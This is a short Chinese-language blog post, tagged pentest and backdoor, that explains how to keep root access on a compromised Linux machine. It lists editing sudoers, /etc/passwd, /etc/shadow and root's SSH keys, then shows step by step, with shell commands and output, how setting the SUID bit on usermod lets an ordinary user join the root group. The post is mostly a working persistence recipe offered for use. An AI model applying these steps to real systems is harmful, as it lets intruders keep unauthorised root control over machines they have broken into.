---
draft: false
date: 2016-04-18 20:03:07
title: Linux 之 SUID 后门
description: 
categories:
  - Pentest
tags:
  - backdoor
---

SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制

### 0x00 为二进制文件添加s权限从而提升为root权限
* 写sudoers添加用户  `//最佳方案`  
* vim /etc/passwd    `//将uid和gid改为0`
* vim /etc/shadow    `//密文覆盖`  
* vim root .ssh/证书文件   `.ssh这个文件夹和证书的权限要正确，要和原来一致`

### 0x01 SUID主要作用可以是留后门
* 在root权限下给usermod一个s权限
```bash
# which usermod   #得到usermod的路径                             
/usr/sbin/usermod
# chmod u+s /usr/sbin/usermod
# ls -l /usr/sbin/usermod
-rwsr-x---. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
```

* usermod给其他人一个x权限
```bash
[root@localhost ~]# chmod o+x /usr/sbin/usermod
[root@localhost ~]# ls -l /usr/sbin/usermod
-rwsr-x--x. 1 root root 98680 Dec  7  2011 /usr/sbin/usermod
```

* 切换到普通用户wyb
```bash
[wyb@localhost ~]$ id wyb
uid=500(wyb) gid=500(wyb) groups=500(wyb)
[wyb@localhost ~]$ usermod -g root wyb
[wyb@localhost ~]$ id wyb
uid=500(wyb) gid=0(root) groups=0(root)
[wyb@localhost ~]$ exit
```

* 验证
```bash
重新用wyb连接，此时即为root权限
[wyb@localhost ~]$ cd /root  #若能切换到此目录即证明确实获得了root权限
[wyb@localhost root]$ ls
anaconda-ks.cfg  install.log  install.log.syslog
```

### 0x02 查找拥有s权限的文件
* find / -perm -u=s -type f 2>/dev/null
